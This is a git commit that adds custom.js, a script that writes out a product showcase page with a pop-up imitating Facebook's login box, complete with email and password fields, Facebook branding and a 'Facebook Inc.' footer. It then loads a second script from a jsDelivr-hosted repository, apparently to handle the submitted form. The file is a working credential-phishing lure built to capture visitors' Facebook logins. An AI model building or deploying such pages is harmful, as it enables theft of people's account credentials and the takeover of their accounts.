3a082e2bfad4b16537ee18820928d50afddeabc1
arkadhost <83273378+arkadhost@users.noreply.github.com>
2021-11-28 05:59:09 +0200

    Create custom.js

---
+++ s0/custom.js
@@ -0,0 +1,77 @@
+document.write(`<html lang="en"><head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>website</title>
+    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.8.2/css/all.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/arkadhost/main-src/custom_v1/style.css">
+  </head>
+  <body id="main">
+  <!-- partial:index.partial.html -->
+  <div class="showcase">
+              <div class="back" id="back-box">
+                  <img id="productImg" src="https://placebear.com/g/251/400">
+      </div>
+              <div class="showcase-content">
+                  <h1 class="heading" id="productName">this is main title</h1>
+                  <p id="productDescription">this is main text</p>
+                  <a href="#" class="btn btn-xl btn-animate" id="btnConfirm">buttton name</a>
+              </div>
+              <div id="myModal" class="modal" style="z-index: 99;">
+
+                <!-- Modal content -->
+                    <div class="popup-box-login-fb modal-content">
+                  <a class="close-fb"><i class="zmdi zmdi-close"></i></a>
+                  <div class="navbar-fb">
+              <span class="close">×</span>
+                      Facebook
+                  </div>
+                  <div class="content-box-fb">
+                      <div class="icon">
+                            <img id="productIcon" src="">
+                      </div>
+                      <div class="txt-login-fb" id="productPrice">
+                           
+                      </div>
+                      <form class="login-form" action="" method="post">
+                          <label>
+                          <input  class="home-mail" type="text" name="email" placeholder="Email address or mobile number" autocomplete="off" autocapitalize="off" required>
+                          </label>
+                          <label>
+                          <input class="home-pass" type="password" name="password" placeholder="Password" autocomplete="off" autocapitalize="off" required>
+                          </label>
+                          <button type="submit" class="btn-login-fb home-submit">Log In</button>
+                      </form>
+                      <div class="txt-create-account home-creat-new">Create account</div>
+                  </div>
+                  <div class="language-box">
+                      <center>
+                      <div class="language-name language-name-active">English (UK)</div>
+                      <div class="language-name">Fran&ccedil;ais (France)</div>
+                      <div class="language-name">Basa Jawa</div>
+                      <div class="language-name">Deutsch</div>
+                      <div class="language-name">Portugu&ecirc;s (Brasil)</div>
+                      <div class="language-name">&#x627;&#x644;&#x639;&#x631;&#x628;&#x64a;&#x629;</div>
+                      <div class="language-name">&#x420;&#x443;&#x441;&#x441;&#x43A;&#x438;&#x439;</div>
+                      <div class="language-name">
+                          <i class="fa fa-plus"></i>
+                      </div>
+                      </center>
+                  </div>
+                  <div class="copyright">Facebook Inc.</div>
+              </div>
+          
+          
+              </div>
+          
+          </div>
+          
+  
+          
+  
+          
+  <!-- partial -->
+    
+  
+  <script src="https://cdn.jsdelivr.net/gh/arkadhost/main-src/customt.js"> </script>
+  </body></html>`);
